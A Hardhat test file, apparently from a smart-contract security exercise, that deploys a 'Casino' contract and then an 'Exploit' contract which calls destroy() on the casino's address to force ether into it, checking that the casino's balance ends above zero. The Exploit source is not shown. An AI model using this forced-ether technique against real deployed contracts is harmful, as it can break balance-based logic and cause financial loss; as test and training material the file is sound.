const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Greeter", function () {
  let attacker, deployer; 
  before( async function() {
    [attacker, deployer] = await ethers.getSigners()

    const CasinoFactory = await hre.ethers.getContractFactory("Casino", deployer)
    this.casino = await CasinoFactory.deploy()
    await this.casino.deployed()

    expect(await ethers.provider.getBalance(this.casino.address)).to.eq(0)

  })

  it("Casino exploit", async function () {
    
    const ExploitFactory = await hre.ethers.getContractFactory("Exploit", attacker)
    const exploit = await ExploitFactory.deploy({value: 10})
    await exploit.deployed()

    await exploit.destroy(this.casino.address)
  });

  after( async function(){

    expect(await ethers.provider.getBalance(this.casino.address)).to.gt(0)
  })
});
